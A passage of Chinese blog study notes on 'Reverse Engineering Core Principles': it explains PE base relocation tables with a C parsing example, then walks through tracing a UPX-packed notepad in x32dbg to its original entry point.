alt="image-20211203185112174"></p><blockquote><p>ASLR机制也适用于DLL&#x2F;SYS文件。对于各OS的主要系统DLL,微软会根据不同版本分别赋予不同的ImageBase地址。同一系统的kernel32.dll、user32.dll等会被加栽到自身固有的ImageBase，所以，系统的DLL实际不会发生重定位问题。</p></blockquote><p>Windows Vista&#x2F;7的系统DLL虽然也拥有自身固有的ImageBase,但是ASLR机制使每次启动时加载的地址都不尽相同。关于ASLR的详细内容请参考后面的章节。</p><h1 id="16-2-PE重定位时执行的操作"><a href="#16-2-PE重定位时执行的操作" class="headerlink" title="16.2 PE重定位时执行的操作"></a>16.2 PE重定位时执行的操作</h1><p>下面以Windows7的notepad.exe程序为例，看看PE重定位时都发生了什么。如下图所示，<br>notepad.exe的ImageBase为01000000。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC16%E7%AB%A0%20%E5%9F%BA%E5%9D%80%E9%87%8D%E5%AE%9A%E4%BD%8D%E8%A1%A8.assets/image-20211203185749783.png" alt="image-20211203185749783"></p><p>接下来，使用x32dbg运行notepad.exe程序</p><p>下图是Windows7中notepad.exe的EP代码部分。在Windows 7的ASLR机制作用下，程序被加载到00DF0000地址处。从图中指令可以看到，方框中进程的内存地址以硬编码形式存在。地址DF3053、DF3B0C是.text节区的IAT区域，地址DFC25C是.data节区的全局变量。每当在x32dbg中重新启动notepad.exe，地址值就随加载地址的不同而改变。像这样，使硬编码在程序中的内存地址随当前加载地址变化而改变的处理过程就是PE重定位。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC16%E7%AB%A0%20%E5%9F%BA%E5%9D%80%E9%87%8D%E5%AE%9A%E4%BD%8D%E8%A1%A8.assets/image-20211203190228302.png" alt="image-20211203190228302"></p><p>无法加载到ImageBase地址时，若未进行过PE重定位处理，应用程序就不能正常运行（因发生“内存地址引用错误”，程序异常终止）。</p><p>在磁盘文件中，硬编码的地址以ImageBase（01000000）为基准。生成（构建）notepad.exe文件时，由于无法预测程序被实际加载到哪个地址，所以记录硬编码地址时以ImageBase为基准。但在运行的瞬间，经过PE重定位后，这些地址全部以加载地址为基准变换，最后程序得以正常执行而不发生错误。</p><p>接下来了解一下PE文件的重定位操作原理。</p><h1 id="16-3-PE重定位的基本操作原理"><a href="#16-3-PE重定位的基本操作原理" class="headerlink" title="16.3 PE重定位的基本操作原理"></a>16.3 PE重定位的基本操作原理</h1><p>Windows的PE装载器进行PE重定位处理时，基本的操作原理很简单。</p><p>PE重定位的基本操作原理</p><ul><li>在应用程序中查找硬编码的地址位置。 </li><li>读取值后，减去ImageBase (VA→RVA)。 </li><li>加上实际加载地址（RVA→VA)，并使用该值替代原来的硬编码地址。</li></ul><p>其中最关键的是查找硬编码地址的位置。查找过程中会用到PE文件内部的Relocation Table（重定位表），它是记录硬编码地址偏移（位置）的列表（重定位表是在PE文件构建过程（编译&#x2F;链接）中提供的）。通过重定位表查找，其实就是指根据PE头的“基址重定位表”项进行的查找。</p><h2 id="16-3-1-基址重定位表"><a href="#16-3-1-基址重定位表" class="headerlink" title="16.3.1 基址重定位表"></a>16.3.1 基址重定位表</h2><p>基址重定位表地址位于PE头的DataDirectoiy数组的第六个元素（数组索引为5），如下图所示。<br>IMAGE_NT_HEADERS\IMAGE_OPTION_HEADER\IMAGE_DATA_DIRECTORY[5]</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC16%E7%AB%A0%20%E5%9F%BA%E5%9D%80%E9%87%8D%E5%AE%9A%E4%BD%8D%E8%A1%A8.assets/image-20211203191107789.png" alt="image-20211203191107789"></p><p>上图中基址重定位表的地址为RVA 2F000，转换成FOA值为2AE00。</p><h2 id="16-3-2-IMAGE-BASE-RELOCATION-结构体"><a href="#16-3-2-IMAGE-BASE-RELOCATION-结构体" class="headerlink" title="16.3.2 IMAGE_BASE_RELOCATION 结构体"></a>16.3.2 IMAGE_BASE_RELOCATION 结构体</h2><p>上图的基址重定位表中罗列了硬编码地址的偏移（位置）。读取这张表就能获得准确的硬编码地址偏移。基址重定位表是IMAGE_BASE_RELOCATION结构体数组。</p><p>IMAGE_BASE_RELOCATION结构体的定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//</span><br><span class="hljs-comment">// Based relocation format.</span><br><span class="hljs-comment">//</span><br><br><span class="hljs-comment">//@[comment(&quot;MVI_tracked&quot;)]</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IMAGE_BASE_RELOCATION</span> &#123;</span><br>    DWORD   VirtualAddress;<br>    DWORD   SizeOfBlock;<br><span class="hljs-comment">//  WORD    TypeOffset[1];</span><br>&#125; IMAGE_BASE_RELOCATION;<br><span class="hljs-keyword">typedef</span> IMAGE_BASE_RELOCATION UNALIGNED * PIMAGE_BASE_RELOCATION;<br><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// Based relocation types.</span><br><span class="hljs-comment">//</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IMAGE_REL_BASED_ABSOLUTE              0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IMAGE_REL_BASED_HIGH                  1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IMAGE_REL_BASED_LOW                   2</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IMAGE_REL_BASED_HIGHLOW               3</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IMAGE_REL_BASED_HIGHADJ               4</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IMAGE_REL_BASED_MACHINE_SPECIFIC_5    5</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IMAGE_REL_BASED_RESERVED              6</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IMAGE_REL_BASED_MACHINE_SPECIFIC_7    7</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IMAGE_REL_BASED_MACHINE_SPECIFIC_8    8</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IMAGE_REL_BASED_MACHINE_SPECIFIC_9    9</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IMAGE_REL_BASED_DIR64                 10</span><br></code></pre></td></tr></table></figure><p>IMAGE_BASE_RELOCATION结构体的第一个成员为VirtualAddress，它是一个基准地址（BaseAddress），实际是RVA值。第二个成员为SizeOfBlock，指重定位块的大小。最后一项TypeOffset数组不是结构体成员，而是以注释形式存在的，表示在该结构体之下会出现WORD类型的数组，并且该数组元素的值就是硬编码在程序中的地址偏移。</p><h2 id="16-3-3-基址重定位表的分析方法"><a href="#16-3-3-基址重定位表的分析方法" class="headerlink" title="16.3.3 基址重定位表的分析方法"></a>16.3.3 基址重定位表的分析方法</h2><p>进一步展示重定位表，如下图所示：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC16%E7%AB%A0%20%E5%9F%BA%E5%9D%80%E9%87%8D%E5%AE%9A%E4%BD%8D%E8%A1%A8.assets/image-20211203193715050.png" alt="image-20211203193715050"></p><p>由IMAGE_BASE_RELOCATION结构体的定义可知，VirtualAddress成员（基准地址）的值为 1000h，SizeOfBlock成员的值为150h。也就是说，上图中显示的TypeOffset数组的基准地址（起始地址）为RVA 1000，整个重定位块的总大小为150h（这些块按照基准地址分类，以数组形式存在)。块的末端显示为0。</p><p>TypeOffset值为2个字节（16位）大小，是由4位的Type与12位的Offset合成的。比如，TypeOffset值为3420，解析如上，高4位用作Type, PE文件中常见的值为3（IMAGE_REL_BASED_HIGHLOW），64位的PE+文件中常见值为A（IMAGE_REL_BASED_DIR64）。</p><blockquote><p>在恶意代码中正常修改文件代码后，有时要修改指向相应区域的重定位表（为了略去PE装载器的重定位过程，常常把Type值修改为0 （IMAGE_REL_BASED_ABSOLUTE））</p></blockquote><p>TypeOffset的低12位是真正的位移，该位移值基于Virtual Address的偏移。所以程序中硬编码地址的偏移使用下面等式换算。</p><p>VirtualSize(1000)+Offset(420)&#x3D;1420(RVA)</p><p>下面看一下RVA 1420处是否实际存在要执行PE重定位操作的硬编码地址，如下图所示：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC16%E7%AB%A0%20%E5%9F%BA%E5%9D%80%E9%87%8D%E5%AE%9A%E4%BD%8D%E8%A1%A8.assets/image-20211203195421704.png" alt="image-20211203195421704"></p><p>图16-8中notepad.exe被加载到DF0000地址处。故RVA 1420即为VA DF1420,该地址处存储着IAT地址（VA，DF10C4 )。并且该值经过PE重定位而发生了变化。使用相同原理，DF142D、DF1436地址的内容也都是硬编码到程序中的地址值，该偏移可以在表16-2中求得。</p><blockquote><p>TypeOffset项中指向位移的低12位拥有的最大地址值为1000。为了表示更大的地址，要添加1个与其对应的块，由于这些块以数组形式罗列，故称为重定位表。</p></blockquote><h2 id="16-3-4-练习"><a href="#16-3-4-练习" class="headerlink" title="16.3.4 练习"></a>16.3.4 练习</h2><p>本小节将通过简单练习进一步加深大家对PE重定位操作原理的理解。练习过程将参照本节开始内容中列出的步骤进行。运行Notepad.exe时，假设它被加载到00DF0000,而不是ImageBase地 址（01000000）中。那此时PE重定位是如何进行的呢？</p><ol><li>查找程序中硬编码地址的位置</li></ol><p>程序中使用的硬编码地址的偏移（位置）可以通过基址重定位表查找到（此处使用上面求得的RVA 1420）。该RVA对应的在文件中的偏移量为820。查看该地址，如下所示：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC16%E7%AB%A0%20%E5%9F%BA%E5%9D%80%E9%87%8D%E5%AE%9A%E4%BD%8D%E8%A1%A8.assets/image-20211203210506422.png" alt="image-20211203210506422"></p><p>从图中可以看到，RVA 1420地址中存在着程序的硬编码地址值010010C4 (请将该值与上上图中的值（00AF10C4）比较）。</p><ol start="2"><li>读取值后，减去ImageBase值（VA→RVA）</li></ol><p>010010C4-01000000&#x3D;000010C4</p><ol start="3"><li>加上实际加载地址（RVA→VA）</li></ol><p>00010C4+00DF0000&#x3D;00DF10C4</p><p>对于程序内硬编码的地址（010010C4），PE装载器都做如上处理，根据实际加载的内存地址修正后，将得到的值（00DF10C4）覆盖到同一位置。对一个IMAGE_BASE_RELOCATION结构体的所有TypeOffset都重复上述过程，且对与RVA 1000~2000地址区域对应的所有硬编码地址都要进行PE重定位处理（参考图16-7）。若TypeOffset值为0,则表明一个IMAGE_BASE_RELOCATION结构体结束。</p><p>对重定位表中出现的所有IMAGE_BASE_RELOCATION结构体都重复上述处理后，就完成了对进程内存区域相应的所有硬编码地址的PE重定位。重定位表以NULL结构体结束（即IMAGE_BASE_RELOCATION结构体成员的值全部为NULL）。</p><p>以上就是PE重定位的操作原理与重定位表结构体的相关内容。</p><h1 id="自实现代码解析"><a href="#自实现代码解析" class="headerlink" title="自实现代码解析"></a>自实现代码解析</h1><p>代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs c">VOID <span class="hljs-title function_">printRelocation</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-comment">//Original buffer</span><br>    LPVOID pFileBuffer = <span class="hljs-literal">NULL</span>;<br>    PIMAGE_DOS_HEADER pDosHeader = <span class="hljs-literal">NULL</span>;<br>    PIMAGE_NT_HEADERS pNTHeader = <span class="hljs-literal">NULL</span>;<br>    PIMAGE_FILE_HEADER pPEHeader = <span class="hljs-literal">NULL</span>;<br>    PIMAGE_OPTIONAL_HEADER32 pOptionHeader = <span class="hljs-literal">NULL</span>;<br>    PIMAGE_SECTION_HEADER pSectionHeader = <span class="hljs-literal">NULL</span>;<br>    ReadPEFile(FILEPATH_IN, &amp;pFileBuffer);<br>    pDosHeader = (PIMAGE_DOS_HEADER) pFileBuffer;<br>    pNTHeader = (PIMAGE_NT_HEADERS) ((DWORD) pFileBuffer + pDosHeader-&gt;e_lfanew);<br>    pPEHeader = (PIMAGE_FILE_HEADER) (((DWORD) pNTHeader) + <span class="hljs-number">4</span>);<br>    pOptionHeader = (PIMAGE_OPTIONAL_HEADER32) ((DWORD) pPEHeader + IMAGE_SIZEOF_FILE_HEADER);<br>    pSectionHeader = (PIMAGE_SECTION_HEADER) ((DWORD) pOptionHeader + pPEHeader-&gt;SizeOfOptionalHeader);<br><br>    DWORD relocation_foa = (DWORD) pFileBuffer + RVAtoFOA(pFileBuffer, pOptionHeader-&gt;DataDirectory[<span class="hljs-number">5</span>].VirtualAddress);<br>    PIMAGE_BASE_RELOCATION pimageBaseRelocation = (PIMAGE_BASE_RELOCATION) relocation_foa;<br>    <span class="hljs-type">int</span> num = <span class="hljs-number">0</span>;<br>    PIMAGE_BASE_RELOCATION ptemp1ImageBaseRelocation = pimageBaseRelocation;<br>    PIMAGE_BASE_RELOCATION ptemp2ImageBaseRelocation;<br>    <span class="hljs-keyword">while</span> (TRUE) &#123;<br>        DWORD relocation_table_foa = RVAtoFOA(pFileBuffer, ptemp1ImageBaseRelocation-&gt;VirtualAddress);<br>        PIMAGE_BASE_RELOCATION ptemp2ImageBaseRelocation = (PIMAGE_BASE_RELOCATION) ((DWORD) ptemp1ImageBaseRelocation +<br>                                                                                     ptemp1ImageBaseRelocation-&gt;SizeOfBlock);<br>        <span class="hljs-keyword">if</span> (ptemp2ImageBaseRelocation-&gt;SizeOfBlock == <span class="hljs-number">0</span> &amp;&amp; ptemp1ImageBaseRelocation-&gt;VirtualAddress == <span class="hljs-number">0</span>) &#123; <span class="hljs-keyword">break</span>; &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            ptemp1ImageBaseRelocation = ptemp2ImageBaseRelocation;<br>            num++;<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//Reuse ptemp1ImageBaseRelocation and ptemp2ImageBaseRelocation</span><br>    ptemp1ImageBaseRelocation = pimageBaseRelocation;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; num; i++) &#123;<br>        ptemp2ImageBaseRelocation = (PIMAGE_BASE_RELOCATION) ((DWORD) ptemp1ImageBaseRelocation + ptemp1ImageBaseRelocation-&gt;SizeOfBlock);<br>        PWORD pRelocationData = (DWORD) ptemp1ImageBaseRelocation;<br>        WORD total_in_block = (ptemp1ImageBaseRelocation-&gt;SizeOfBlock - <span class="hljs-number">8</span>) / <span class="hljs-number">2</span>;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Section %lx h\n&quot;</span>, ptemp1ImageBaseRelocation-&gt;VirtualAddress);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;----------------------------------\n&quot;</span>);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; total_in_block; j++) &#123;<br>            WORD data = *(PWORD) (<span class="hljs-number">8</span> + (DWORD) (pRelocationData + j));<br>            <span class="hljs-comment">// Get three bit</span><br>            <span class="hljs-type">int</span> flag = data &gt;&gt; <span class="hljs-number">12</span>; <span class="hljs-comment">//Flag is 3(need to be fixed) or 0</span><br>            <span class="hljs-comment">//Remove the front 4 bits;</span><br>            WORD address = data &lt;&lt; <span class="hljs-number">4</span>;<br>            address = address &gt;&gt; <span class="hljs-number">4</span>;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Item %d: The RVA is %x, the attribute value is %d\n&quot;</span>, j + <span class="hljs-number">1</span>, address, flag);<br><br>        &#125;<br>        ptemp1ImageBaseRelocation = ptemp2ImageBaseRelocation;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>运行结果：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC16%E7%AB%A0%20%E5%9F%BA%E5%9D%80%E9%87%8D%E5%AE%9A%E4%BD%8D%E8%A1%A8.assets/image-20211203211859176.png" alt="image-20211203211859176"></p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>《逆向工程核心原理》 第16章</p>]]></content>
    
    
    <categories>
      
      <category>Binary</category>
      
      <category>逆向工程核心原理</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Binary</tag>
      
      <tag>逆向工程核心原理</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>第15章 调试UPX压缩的notepad程序</title>
    <link href="/1999/02/13/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/%E7%AC%AC15%E7%AB%A0%20%E8%B0%83%E8%AF%95UPX%E5%8E%8B%E7%BC%A9%E7%9A%84notepad%E7%A8%8B%E5%BA%8F/"/>
    <url>/1999/02/13/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/%E7%AC%AC15%E7%AB%A0%20%E8%B0%83%E8%AF%95UPX%E5%8E%8B%E7%BC%A9%E7%9A%84notepad%E7%A8%8B%E5%BA%8F/</url>
    
    <content type="html"><![CDATA[<p>本章将调试UPX压缩的notepad_upx.exe程序，进一步了解运行时压缩的相关概念。我们的目 标是通过调试一点点地跟踪代码，最终找出原notepadexe程序代码。最后再简单讲解一下经过UPX压缩的文件如何通过调试器。</p><blockquote><p>本章示例使用的是Windows XP SP3中的notepad.exe程序。</p><p>调试环境为Win7 环境</p></blockquote><h1 id="15-1-notepad-exe-的-EP-代码"><a href="#15-1-notepad-exe-的-EP-代码" class="headerlink" title="15.1 notepad.exe 的 EP 代码"></a>15.1 notepad.exe 的 EP 代码</h1><p>首先看一下原notepad.exe程序的EP代码，如图15-1所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC15%E7%AB%A0%20%E8%B0%83%E8%AF%95UPX%E5%8E%8B%E7%BC%A9%E7%9A%84notepad%E7%A8%8B%E5%BA%8F.assets/image-20211208194425237.png" alt="图15-1"> </p><p>在010073B2地址处调用了GetModuleHandleA() API,获取notepad.exe程序的ImageBase。然后 在010073B4与010073C0地址处比较MZ与PE签名。希望各位熟记原notepad.exe的EP代码。</p><h1 id="15-2-notepad-upx-exe-的-EP-代码"><a href="#15-2-notepad-upx-exe-的-EP-代码" class="headerlink" title="15.2 notepad_upx.exe 的 EP 代码"></a>15.2 notepad_upx.exe 的 EP 代码</h1><p>使用x32dbg打开notepad_upx.exe显示岀UPX EP代码，如图15-3所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC15%E7%AB%A0%20%E8%B0%83%E8%AF%95UPX%E5%8E%8B%E7%BC%A9%E7%9A%84notepad%E7%A8%8B%E5%BA%8F.assets/image-20211209115812622.png" alt="图15-3"></p><p>EP地址为010143E0,该处即为第二个节区的末端部分。实际压缩的notepad源代码存在于EP地址（010143E0）的上方。</p><p>下面看一下代码的开始部分（ 01014400）。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">01015330            | 60                  | pushad                                             |<br>01015331            | BE 00100101         | mov esi,notepad_upx.1011000                        |<br>01015336            | 8DBE 0000FFFF       | lea edi,dword ptr ds:[esi-10000]                   |<br></code></pre></td></tr></table></figure><p>首先使用PUSHAD命令将EAX~EDI寄存器的值保存到栈，然后分别把第二个节区的起始地址（1011000）与第一个节区的起始地址（ 1001000）设置到ESI与EDI寄存器。UPX文件第一个节区<strong>仅</strong>存在于内存。该处即是解压缩后保存源文件代码的地方。</p><p>调试时像这样同设置ESI与EDI，就能预见从ESI所指缓冲区到EDI所指缓冲区的内存发生了复制。此时从Source （ ESI ）读取数据，解压缩后保存到Destination （ EDI ）。我们的目标是跟踪图15-3中的全部UPXEP代码，并最终找到原notepad的EP代码，如图15-1所示。</p><blockquote><ul><li>代码逆向分析称源文件的EP为OEP。</li><li>“跟踪” 一词的含义是通过逐一分析代码进行追踪。</li><li>实际的代码逆向分析中并不会逐一跟踪执行压缩代码，常使用自动化脚本、特殊技巧等找到OEP。但是对于初次学习运行时压缩文件的朋友而言，逐一跟踪代码才是正确的学习方法</li></ul></blockquote><h1 id="15-3-跟踪UPX文件"><a href="#15-3-跟踪UPX文件" class="headerlink" title="15.3 跟踪UPX文件"></a>15.3 跟踪UPX文件</h1><p>下面开始跟踪代码，跟踪数量庞大的代码时，请遵循如下法则。 </p><blockquote><p><strong>“遇到循环（Loop）时，先了解作用再跳出。”</strong></p></blockquote><p>整个解压缩过程由无数循环组成。因此，只有适当跳岀循环才能加快速度。</p><h2 id="15-3-1-x32dbg的跟踪命令"><a href="#15-3-1-x32dbg的跟踪命令" class="headerlink" title="15.3.1 x32dbg的跟踪命令"></a>15.3.1 x32dbg的跟踪命令</h2><p>跟踪数量庞大的代码时，通常不会使用Step Int0（F7）命令，而使用x32dbg中另外提供的跟踪调试命令，如下表所示。</p><table><thead><tr><th>命令</th><th>快捷键</th><th>说明</th></tr></thead><tbody><tr><td>自动步进（Animate Into）</td><td>Ctrl + F7</td><td>反复执行步进命令（画面显示）</td></tr><tr><td>自动步过（Animate Over）</td><td>Ctrl + F8</td><td>反复执行步过命令（画面显示）</td></tr><tr><td>步进直到条件满足（Trace Into）</td><td>Ctrl + Alt + F7</td><td>反复执行步进命令直到条件满足（画面不显示）</td></tr><tr><td>步过直到条件满足（Trace Over）</td><td>Ctrl + Alt + F8</td><td>反复执行步过命令直到条件满足（画面不显示）</td></tr></tbody></table><p>除了画面显示的之外，Animate命令与Trace命令是类似的，由于Animate命令要把跟踪过程显示在画面中，所以执行速度略微慢一些。而两者最大的差别在于，跟踪命令会自动在事先设置的跟踪条件处停下来，并生成日志文件。在UPX文件跟踪中将使用Animate Over（Ctrl+F8）命令。</p><h2 id="15-3-2-循环-1"><a href="#15-3-2-循环-1" class="headerlink" title="15.3.2 循环 #1"></a>15.3.2 循环 #1</h2><p>在EP代码处执行Animate Over（Ctrl+F8）命令，开始跟踪代码。可以看到光标快速上下移动。</p><p>若想停止跟踪，执行Pause（F12）命令即可。</p><p>开始跟踪代码不久后，会遇到一个短循环。暂停跟踪，仔细查看相应循环，如图15-4所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC15%E7%AB%A0%20%E8%B0%83%E8%AF%95UPX%E5%8E%8B%E7%BC%A9%E7%9A%84notepad%E7%A8%8B%E5%BA%8F.assets/image-20211209120019727.png" alt="图15-4"></p><p>循环次数ECX&#x3D;36B,循环内容为“从EDX（ 01001000 ）中读取一个字节写人EDI（ 01001001 ）“。</p><p>EDI寄存器所指的01001000地址即是第一个节区（UPX0 ）的起始地址，仅存在于内存中的节区（反正内容全部为NULL）。</p><p>调试经过运行时压缩的文件时，遇到这样的循环应该跳岀来。在010153E6地址处按F2键设置好断点后，按F9跳出循环。</p><h2 id="15-3-3-循环-2"><a href="#15-3-3-循环-2" class="headerlink" title="15.3.3 循环 #2"></a>15.3.3 循环 #2</h2><p>在断点处再次使用Animate Over（Ctrl+F8）命令继续跟踪代码，不久后遇到图15-5所示的循环</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC15%E7%AB%A0%20%E8%B0%83%E8%AF%95UPX%E5%8E%8B%E7%BC%A9%E7%9A%84notepad%E7%A8%8B%E5%BA%8F.assets/image-20211209120241281.png" alt="图15-5"></p><p>该循环是正式的解码循环（或称为解压缩循环）。</p><p>先从ESI所指的第二个节区（UPX1）地址中依次读取值，经过适当的运算解压缩后，将值写<br>入EDI所指的第一个节区（UPX0）地址。该过程中使用的指令如下： </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0101534B            | 8807                | mov byte ptr ds:[edi],al                           |<br>0101534D            | 47                  | inc edi                                            |<br>....<br>010153E0            | 8807                | mov byte ptr ds:[edi],al                           |<br>010153E2            | 47                  | inc edi                                            |<br>...<br>010153F1            | 8907                | mov dword ptr ds:[edi],eax                         |<br>010153F3            | 83C7 04             | add edi,4                                          |<br></code></pre></td></tr></table></figure><blockquote><p>解压缩后的数据在AL（EAX）中，EDI指向第一个节区的地址。 </p></blockquote><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC15%E7%AB%A0%20%E8%B0%83%E8%AF%95UPX%E5%8E%8B%E7%BC%A9%E7%9A%84notepad%E7%A8%8B%E5%BA%8F.assets/image-20211208213024780.png" alt="图15-5"></p><p>只要在010144B2地址处设置好断点再运行，即可跳出第二个循环，如图15-5所示。运行到010144B2地址后，在转储窗口中可以看到解压缩后的代码已经被写入第一个节区（UPX0）区域（01007000），如图15-5中原来用NULL填充的区域。</p><h2 id="15-3-4-循环-3"><a href="#15-3-4-循环-3" class="headerlink" title="15.3.4 循环 #3"></a>15.3.4 循环 #3</h2><p>重新跟踪代码，稍后会遇到图15-6所示的第三个循环。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC15%E7%AB%A0%20%E8%B0%83%E8%AF%95UPX%E5%8E%8B%E7%BC%A9%E7%9A%84notepad%E7%A8%8B%E5%BA%8F.assets/image-20211209120323564.png" alt="图15-6"></p><p>该段循环代码用于恢复源代码的CALL&#x2F;JMP指令（操作码：E8&#x2F;E9）的destination地址。在 01015436地址处设置断点运行后即可跳出循环。</p><p>到此几乎接近尾声了，只要再设置好IAT，UPX解压缩代码就结束了。</p><blockquote><p>对于普通的运行时压缩文件，源文件代码、数据、资源解压缩之后，先设置好IAT再转到OEP。</p></blockquote><h2 id="15-3-5-循环-4"><a href="#15-3-5-循环-4" class="headerlink" title="15.3.5 循环 #4"></a>15.3.5 循环 #4</h2><p>重新跟踪代码，再稍微进行一段。 </p><p>图15-7深色显示的部分即为设置IAT的循环。在01015436地址处设置EDI&#x3D;01014000,它指向第二个节区（UPX1）区域，该区域中保存着原notepad.exe调用的API函数名称的字符串（参考图15-8 ）。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC15%E7%AB%A0%20%E8%B0%83%E8%AF%95UPX%E5%8E%8B%E7%BC%A9%E7%9A%84notepad%E7%A8%8B%E5%BA%8F.assets/image-20211209193142054.png" alt="图15-7"></p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC15%E7%AB%A0%20%E8%B0%83%E8%AF%95UPX%E5%8E%8B%E7%BC%A9%E7%9A%84notepad%E7%A8%8B%E5%BA%8F.assets/image-20211209193220025.png" alt="图15-8"></p><p>UPX压缩原notepad.exe文件时，它会分析其IAT，提取岀程序中调用的API名称列表，形成API名称字符串。</p><p>用这些API名称字符串调用图15-7中01015467地址处的GetProcAddress()函数，获取API的起始地址，然后把API地址输人EBX寄存器所指的原notepad.exe的IAT区域。该过程会反复进行至API名称字符串结束，最终恢复原notepad.exe的IAT。</p><p>notepad.exe全部解压缩完成后，应该将程序的控制返回到OEP处。图15-9显示的就是跳转到OEP的代码。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC15%E7%AB%A0%20%E8%B0%83%E8%AF%95UPX%E5%8E%8B%E7%BC%A9%E7%9A%84notepad%E7%A8%8B%E5%BA%8F.assets/image-20211209193632554.png" alt="图15-9"></p><p>另外，010154AD地址处的POPAD命令与UPX代码的第一条PUSHAD命令对应，用来把当前寄存器恢复原状（参考图15-3 ）。</p><p>最终，使用010154BB地址处的JMP命令跳转到OEP处，要跳转到的目标地址为0100739D，它就是原notepad.exe的EP地址（请各位确认）。</p><h1 id="15-4-快速查找UPX-OEP的方法"><a 